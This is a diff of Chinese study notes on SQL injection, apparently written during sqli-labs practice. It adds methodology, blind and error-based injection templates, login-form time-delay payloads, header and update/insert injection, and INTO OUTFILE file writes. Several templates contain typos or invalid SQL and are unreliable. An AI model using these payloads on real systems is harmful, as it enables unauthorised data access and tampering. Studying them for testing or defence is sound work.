@@ -258,6 +258,8 @@ into outfile()函数可以将字符串写入文件，此函数的执行也需要
    2. 猜测后端查询语句
       1. 判断注入类型
       2. 判断闭合符
+      3. 根据==网页有无回显内容、有无报错以及报错内容形式==来选择适合的注入方式
+      4. 构造后端查询语句
    3. 判断数据库版本是否大于4,以便后面使用information_schema库
    4. 构造注入
 
@@ -267,9 +269,9 @@ into outfile()函数可以将字符串写入文件，此函数的执行也需要
    2. 猜测后端查询语句
       1. 判断注入类型
       2. 判断闭合符
-   3. 判断数据库版本是否大于4,以便后面使用information_schema库
-   4. 判断字段数
-   5. 判断显示位
+   3. 判断字段数
+   4. 判断显示位
+   5. 判断数据库版本是否大于4,以便后面使用information_schema库
    6. 查库名
    7. 查表名
    8. 查列名
@@ -277,7 +279,7 @@ into outfile()函数可以将字符串写入文件，此函数的执行也需要
 
 ## information_schema库
 
-只有MySQL4.0以上的版本才有这个库
+只有MySQL5.0及以上的版本才有这个库
 
 作用：保存数据库管理系统的各个库的结构信息（表明了：库中包含哪些表、表中包含哪些字段），相当于一个账簿的角色。
 
@@ -353,7 +355,7 @@ into outfile()函数可以将字符串写入文件，此函数的执行也需要
 
 ## 注意:
 
-==只有使用了union查询的情况下,才需要判断网站使用的表的字段数,使用and则不需要!!!==
+==只有使用了union查询的情况下,才需要通过order by判断网站原有SQL语句查询的字段数,使用and则不需要!!!==
 
 ## 联合查询注入
 
@@ -638,6 +640,12 @@ http://192.168.96.135/sqli-labs/Less-9/
    2. 判断闭合符
 3. 构造注入
 
+## 盲注总结
+
+1. ==可以发生回显、报错、bool注入的地方都可以发生时间盲注，反之不行==
+
+2. ==可以发生回显报错的地方一定可以bool型盲注，反之不行==
+
 ## 报错注入
 
 报错注入常用场景:
@@ -659,6 +667,8 @@ count(*)是必须带上的。
 1. 输出字符长度限制为32个字符,查询到的数据超长无法显示的,可以使用substr()函数截取之后分段显示
 2. 后台返回记录列数至少2列
 
+insert into t_xx (username,password) values (xxx,xxx) where username = 'Dhakkan'
+
 报错注入需要满足的条件:
 
 1. 注入语句中查询用到的表内数据必须>=3条
@@ -672,8 +682,7 @@ count(*)是必须带上的。
 - **原理：**`updatexml`使用时，当`xpath_string`格式出现错误，`mysql`则会爆出xpath语法错误（`xpath syntax`）
 - **例如：** `select * from test where ide = 1 and (updatexml(1,0x7e,3));` 由于`0x7e`是`~`，不属于xpath语法格式，因此报出xpath语法错误。
 
-MySQL执行1=(updatexml(1,concat(0x3a,(payload)),1))将报错。
-限制1：
+限制：
 
 1. 输出字符长度限制为32个字符
 2. 仅payload返回的不是xml格式，才会生效
@@ -698,7 +707,7 @@ and extractvalue('anything',concat('/',(Payload)))    将报错，不推荐使�
 union select 1,(extractvalue(1,concat(0x7e,(payload),0x7e))),3  不存在丢失报错成果的情况。推荐使用
 ```
 
-#### 其他模板
+### 其他报错注入模板
 
 ```
 1、通过floor报错,注入语句如下:
@@ -708,7 +717,7 @@ and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from info
 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));
 
 3、通过UpdateXml报错,注入语句如下:
-and 1=(updatexml(1,concat(0x3a,(payload)),1))
+and updatexml(1,concat(0x3a,(payload)),1)
 
 4、通过NAME_CONST报错,注入语句如下:
 and exists(select*from (select*from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)
@@ -738,7 +747,54 @@ and multpolygon (()select * from(selectuser () )a)b );
 and linestring (()select * from(select user() )a)b );
 ```
 
+### 报错注入小技巧:
 
+如果是在修改密码之类的界面,需要先输入用户名或者原密码的情况下,旧数据和新数据同时输入,有可能会出现不报错的情况,此时==可以尝试在输入旧数据的输入框输入正确的数据,在新数据输入框中猜测后端查询语句,并构造注入,有可能会爆出错误从而直接利用报错注入拿到数据!!!==
+
+
+
+## 表单注入
+
+### 表单注入之延时盲注
+
+```mysql
+#假设前端登录表单的后端语句如下
+select * from t_xx where username='xxx' and password='xxxx'
+
+#需要理解的知识:
+1 and 1 = 1
+1 and 0 = 0
+0 and 1 = 0
+0 and 0 = 0
+即:与运算中,全真为真、其他为假
+1 or 1 = 1
+1 or 0 = 1
+0 or 1 = 1
+0 or 0 = 0
+即:或运算中，全假为假、其他为真
+
+and和or同时出现在一个语句中，会优先进行or运算，再进行and运算
+
+由以上可得：
+想要注入成功，需要一个正确的username，密码后面附带or运算，保证or后面语句为真即可执行代码
+注入语句构造如下：
+select * from t_xx where username='xxx' and password='xxxx' or if(payload,sleep(3),1)   #'
+
+注意：or后面的sleep()可能会有超长延时，具体延时大致是表中数据条数的倍数
+```
+
+
+
+## http头部注入
+
+如果猜测到后端有SQL查询，而且会带入http请求头中的字段内容，那么该功能点可能存在SQL注入。
+==头部注入通常用在后端记录日志入库的场景。==
+
+## update、insert注入
+
+update、insert注入通常使用报错注入，将注入语句构造在要修改或者插入的值或条件当中
+
+update users set passwd='ccc'and payload # ' where username="xxx"
 
 ## 文件读写
 
@@ -774,8 +830,8 @@ SELECT "123abc" INTO DUMPFILE "c:/123.txt";
   1. 判断注入类型
   2. 判断闭合符
 4. 构造注入
-  SELECT "123" INTO OUTFILE "c:/123.txt";
-  select * from t_xx where c_xx=(('xx')) union SELECT 1,2,"123" INTO OUTFILE "c:/123.txt";%23'))
+    SELECT "123" INTO OUTFILE "c:/123.txt";
+    select * from t_xx where c_xx=(('xx')) union SELECT 1,2,"123" INTO OUTFILE "c:/123.txt";%23'))
 
 ### 知识点拓展
 
